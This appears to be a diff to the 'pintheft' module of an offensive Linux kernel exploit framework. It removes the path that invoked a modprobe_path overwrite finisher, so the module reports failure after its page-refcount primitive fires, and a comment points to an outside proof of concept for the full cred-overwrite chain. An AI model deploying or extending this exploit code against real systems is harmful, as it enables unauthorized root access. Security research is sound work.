@@ -344,29 +344,13 @@ static skeletonkey_result_t pintheft_exploit(const struct skeletonkey_ctx *ctx)
 
     fprintf(stderr, "[+] pintheft: primitive fired %d/256 — page refcount delta witnessed\n", leaked);
 
-    /* The cred-overwrite step requires the V12 PoC's io_uring chain.
-     * We don't ship the full chain here yet. If --full-chain is set
-     * AND we're on x86_64 AND the finisher table has resolved kernel
-     * offsets, fall through to the shared modprobe_path finisher;
-     * otherwise return EXPLOIT_FAIL honestly. */
-    if (!ctx->full_chain) {
-        fprintf(stderr,
-            "[i] pintheft: primitive complete. The cred-overwrite step\n"
-            "    (io_uring fixed buffer + page-cache write into the SUID\n"
-            "    carrier) is x86_64-only and needs the V12 chain. Re-run\n"
-            "    with --full-chain to invoke the shared modprobe_path\n"
-            "    finisher. See V12's PoC for the full payload:\n"
-            "    https://github.com/v12-security/pocs/tree/main/pintheft\n");
-        return SKELETONKEY_EXPLOIT_FAIL;
-    }
-
-#if defined(__x86_64__)
-    fprintf(stderr, "[+] pintheft: --full-chain on x86_64 → invoking modprobe_path finisher\n");
-    return finisher_modprobe_path_overwrite(ctx);
-#else
-    fprintf(stderr, "[-] pintheft: --full-chain unsupported on non-x86_64 (V12 PoC is x86-only)\n");
+    /* The cred-overwrite step requires the V12 PoC's io_uring chain
+     * (fixed buffer + page-cache write into the SUID carrier). We don't
+     * ship that chain — primitive only. Return EXPLOIT_FAIL honestly per
+     * the verified-vs-claimed bar. See V12's PoC for the full payload:
+     * https://github.com/v12-security/pocs/tree/main/pintheft */
+    (void)ctx;
     return SKELETONKEY_EXPLOIT_FAIL;
-#endif
 }
 
 #else  /* !__linux__ */
